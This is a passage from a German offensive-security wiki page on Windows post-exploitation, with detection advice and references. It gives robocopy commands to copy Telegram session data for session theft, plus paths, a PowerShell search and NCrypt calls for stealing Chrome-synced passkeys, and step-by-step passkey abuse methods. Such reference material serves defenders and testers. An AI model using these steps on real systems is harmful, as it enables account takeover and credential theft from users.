Erstelle oder lies für aktuell gesperrte Dateien eine **Volume Shadow Copy**. Für durch ACLs blockierte Dateien verwendet `robocopy /B` den Sicherungsmodus und umgeht Datei- und Verzeichnis-ACLs.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Ein bandbreitenbewusstes Implantat kann zunächst nur das Dateipfadinventar übermitteln, eine Snapshot-Kennung sowie die Pfade erhalten, die bereits beim C2 gespeichert sind, und nur fehlende Dateien hochladen. Daher können auch kleine inkrementelle Übertragungen nach einer rekursiven `tdata`-Auflistung auf einen erfolgreichen Diebstahl einer Sitzung hindeuten.<sup>[[10]](#references)</sup>

### Erkennung und Eindämmung

Korreliere rekursive Zugriffe auf `tdata` durch einen Nicht-Telegram-Prozess mit der Aktivierung von `SeBackupPrivilege`, Dateiöffnungen mit Backup-Semantik, VSS-Aktivität oder einem untergeordneten `robocopy.exe`, das `/B` verwendet. Suche außerdem nach einer schnellen Auflistung von `%APPDATA%` und `%LOCALAPPDATA%\Packages`, gefolgt von ausgehenden Verbindungen desselben Prozesses. Nutze nach einer Kompromittierung **Einstellungen → Geräte** (oder **Datenschutz & Sicherheit → Aktive Sitzungen**), um nicht erkannte Sitzungen zu beenden; die Aktivierung der Zwei-Schritt-Verifizierung allein widerruft keine bereits gestohlene Autorisierung.<sup>[[10]](#references)[[13]](#references)</sup>

## Diebstahl von Passkeys-/WebAuthn-Anmeldedaten aus Chrome unter Windows

Wenn Codeausführung als **Opferbenutzer** auf einem Windows-Host mit **Chrome + mit Google Password Manager synchronisierten Passkeys** erreicht wird, sind Passkeys ein interessantes Post-Exploitation-Ziel – auch **ohne Admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interessante lokale Artefakte

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** speichert protobuf-kodierte **`WebauthnCredentialSpecifics`**-Datensätze. Ein Prozess desselben Benutzers kann die **RP ID**, den **Benutzernamen**, die **Credential ID** und das verschlüsselte Material privater Schlüssel für synchronisierte Passkeys auflisten.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** speichert den lokalen Geräteeinschreibungsstatus, etwa **`wrapped_identity_private_key`** und das umhüllte Geheimnis zur Wiederherstellung synchronisierter Credentials.<sup>[[4]](#references)</sup>

Schnelle Triage:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-gebundene Key-Blobs können weiterhin als lokale Signier-Orakel missbraucht werden

Wenn der Browser einen TPM-gestützten Identitätsschlüssel als **`NCRYPT_OPAQUE_KEY_BLOB`** exportiert und diesen Blob in einem für Benutzer zugänglichen Bereich speichert, muss Malware **nicht** den rohen privaten Schlüssel extrahieren. Sie kann den Blob einfach auf **demselben Computer** erneut importieren und das lokale TPM auffordern, vom Angreifer kontrollierte Daten zu signieren:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Das bedeutet: **Hardwarebindung verhindert den Export vom Gerät, nicht aber die Nutzung durch denselben Benutzer auf dem kompromittierten Endpunkt**.

### Praktische Missbrauchswege

1. **Pass-ta-key-/Geräteidentitäts-Relay**<sup>[[4]](#references)</sup>
   - `WebauthnCredentialSpecifics` aus Chromes LevelDB aufzählen.
   - Eine Passkey-Anmeldung starten und eine neue WebAuthn-Challenge abrufen.
   - Mit dem gestohlenen `wrapped_identity_private_key`-Blob auf dem TPM des Opfers die Bindung der Cloud-Authenticator-Anfrage signieren.
   - Die zurückgegebene Assertion an die Relying Party weiterleiten.
   - Das ist besonders wertvoll, wenn die RP `userVerification=preferred` akzeptiert oder Assertions mit **`UV=0`** nicht zurückweist.
2. **Übernahme eines ausstehenden UV-Schlüssels**<sup>[[4]](#references)</sup>
   - Ein erneutes Onboarding erzwingen, indem `passkey_enclave_state` gelöscht oder eine gültige signierte `device/forget`-Operation gesendet wird.
   - Wenn das Onboarding das Gerät im Zustand **`uv_key_pending`** belässt, einen vom Angreifer kontrollierten öffentlichen UV-Schlüssel registrieren.
   - Prüft der Anbieter bei dem neuen UV-Schlüssel weder die Attestierung noch den Ursprung in sicherer Hardware, werden spätere Signaturen des Angreiferschlüssels als **`UV=1`** behandelt.
3. **Diebstahl des Master-Secrets / der SDS-Wiederherstellung**<sup>[[4]](#references)</sup>
   - Eine Wiederherstellung oder erneute Verknüpfung erzwingen, damit Chrome das synchronisierte Passkey-Master-Secret abruft.
   - Die Neuerstellung/Änderung von `passkey_enclave_state` beobachten und anschließend den Chrome-Speicher auslesen, solange das **Security-Domain-Secret (SDS)** im Klartext vorliegt.
   - Mit der wiederhergestellten SDS die verschlüsselten Felder in allen `WebauthnCredentialSpecifics`-Datensätzen entschlüsseln und portable WebAuthn-Privatschlüssel wiederherstellen.

### DFIR- / Erkennungsideen

- **Löschung/Neuerstellung** von `passkey_enclave_state` überwachen.<sup>[[4]](#references)</sup>
- Auf ungewöhnliche Zugriffe von Nicht-Browser-Prozessen auf Chromes **`Sync Data\LevelDB`** aufmerksam machen.
- Auf **Chrome-Speicherdumps** oder verdächtige prozessübergreifende Speicherzugriffe aufmerksam machen.
- Wiederholte Aufforderungen zur **Google Password Manager-Wiederherstellungs-PIN** oder unerwartetes erneutes Onboarding untersuchen.
- Beachten, dass WebAuthn-**`signCount`** bei synchronisierten Passkeys oft nicht hilfreich ist, da der Wert konstant bleiben kann. Die klassische Erkennung von Klonen ist daher unzuverlässig.

## References

- [1] [Unit 42 – Eine Untersuchung jahrelang unentdeckter Operationen gegen hochwertige Sektoren](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → hMailServer-Anmeldedatenentschlüsselung → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Einblick in Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer verdeckten offensiven Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Eine neuartige Angriffsfläche bei passwortloser Authentifizierung](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG-Schlüsselspeicher](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Angriffe auf Microsoft-Systeme und -Netzwerke](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [So funktioniert der Active Directory-Datenspeicher wirklich: Einblick in NTDS.dit (Teil 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Remote-Lsass-Dump von Passwörtern](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho erweitert sein Cyber-Spionage-Arsenal mit dem Still-Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW-Funktion und `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy-Backupmodus `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram-FAQ – aktive Sitzungen beenden](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard und Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Schutz und Verwaltung von Anmeldedaten](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz – unterstützte Eingaben und Schnellstart](https://github.com/nikaiw/VMkatz)
- [18] [0xdf – HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
